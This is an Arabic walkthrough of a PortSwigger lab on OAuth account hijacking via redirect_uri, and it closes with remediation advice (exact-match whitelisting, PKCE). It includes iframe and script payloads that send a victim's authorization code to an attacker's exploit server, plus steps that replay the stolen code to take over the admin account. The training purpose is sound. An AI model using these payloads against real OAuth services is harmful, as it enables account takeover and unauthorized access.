# [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

## **`الهدف`**
سرق الـ `authorization code` لحساب `admin` واستخدامه لتسجيل الدخول إليه ثم حذف حساب `carlos`.
## **`خطوات الحل`**
نقوم بتسجيل الدخول  بحساب `wiener:peter` بعد ذلك نقوم بتسجيل الخروج ومن ثم نقوم بفحص الـ `HTTP history` داخل `Burp` ونلاحظ وجود الـ `request` التالي والذي به `redirect-uri` و `client_id`.
```http
GET /auth?client_id=kak76gdxc5f7sbjom7p7f&redirect_uri=https://0ab8003a0394fc9986a8c57800f500c0.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0a5e007103d0fc4786f9c32402be00aa.oauth-server.net
Cookie: _session=Tvy4wLpCmAjjhjPIJ6GZY; _session.legacy=Tvy4wLpCmAjjhjPIJ6GZY
```

لذلك سنقوم بالتوجه إلى السيرفر الموجود في اللاب ونقوم بوضع إحدي الأكواد التالية في الـ `Body` مع تغيير الـ `URL` الخاص باللاب الحالي ووضع `URL` الخاص بالسيرفر بعد `redirect_uri` بالإضافة إلى تغيير الـ `client_id` و `nonce`.
```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

```html
<script>
    window.location = "https://oauth-0a5e007103d0fc4786f9c32402be00aa.oauth-server.net/auth?client_id=kak76gdxc5f7sbjom7p7f&redirect_uri=https://exploit-0a20003003c9fc588656c40e017f0037.exploit-server.net&response_type=code&scope=openid%20profile%20email";
</script>
```

ونقوم بالضغط على `Store` ثم `Deliver exploit to victim` وبعد ذلك نتوجه إلى `Acces log` لنلاحظ وجود سطر يشبه التالي
```
10.0.3.252      2026-07-26 07:31:07 +0000 "GET /?code=BfcBzz8a4RyzAjrGl_a46TBA_nHuUq1jyr_EYNYCXiZ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

فنقوم بنسخ الكود `BfcBzz8a4RyzAjrGl_a46TBA_nHuUq1jyr_EYNYCXiZ` ونتوجه إلى هذا الرابط مع تغييره ليناسب اللاب الخاص بنا وتغيير الكود.
`https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
ونكمل تسجيل الدخول لنجد أنفسنا في حساب `Admin` فنتوجه إلى لوحة التحكم ونقوم بحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب تطبيق القائمة البيضاء الصارمة `Strict Whitelisting` حيث يجب على سيرفر المصادقة `OAuth Provider` ألا يقبل أي مسار إعادة توجيه ديناميكي يتم تمريره في الطلب، وبدلاً من ذلك، يجب إلزام مالك التطبيق الـ `Client` بتسجيل روابط الـ `redirect_uri` الصالحة والمصرح بها مسبقاً في إعدادات التطبيق على سيرفر المصادقة.
وعند مقارنة الرابط المُرسل بالروابط الموجودة في القائمة البيضاء، يجب أن يكون التحقق مبنياً على التطابق الحرفي التام `Exact Match`

وكطبقة حماية إضافية يجب تفعيل آلية `(PKCE (Proof Key for Code Exchange`، حيث تعتمد هذه التقنية على قيام تطبيق العميل بإنشاء رمز سري `Code Verifier` مؤقت عند بدء طلب الـ `OAuth` ويتم حفظه فقط في الـ `RAM` الخاصة بالتطبيق ولا يتم حفظه في ملفات التطبيق، ثم يتم إرسال نسخة مشفرة منه `Code Challenge` إلى سيرفر المصادقة، وعند استبدال الـ `authorization code` بالـ `Access Token`، يقوم تطبيق العميل بإرسال الرمز السري الأصلي قبل التشفير `Code Verifier` ويقوم سيرفر المصادقة بعمل تشفير له ليطابق الناتج بالناتج الأولى المشفر `Code Challenge` الذي استلمه من تطبيق العميل في الخطوة الأولى.
